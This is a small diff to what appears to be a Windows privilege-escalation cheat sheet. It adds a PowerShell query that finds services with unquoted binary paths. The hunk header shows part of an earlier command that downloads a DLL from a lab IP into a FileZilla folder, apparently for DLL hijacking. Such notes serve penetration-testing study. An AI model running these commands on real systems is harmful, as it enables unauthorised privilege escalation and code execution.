@@ -1170,6 +1170,10 @@ iwr -uri http://192.168.48.3/TextShaping.dll -OutFile 'C:\FileZilla\FileZilla FT
 #### List of services with spaces and missing quotes in the binary path
 
 ~~~ powershell
+Get-WmiObject Win32_Service | Where-Object { $_.PathName -notlike 'C:\Windows\*' -and $_.PathName -notmatch '^\s*\".*\".*$' } | Select-Object Name, DisplayName, PathName, StartMode
+~~~
+
+~~~ powershell
 Get-WmiObject Win32_Service | Where-Object { $_.StartMode -eq 'Auto' -and $_.PathName -notlike 'C:\Windows\*' -and $_.PathName -notmatch '^\s*\".*\".*$' } | Select-Object Name, DisplayName, PathName, StartMode
 ~~~
 
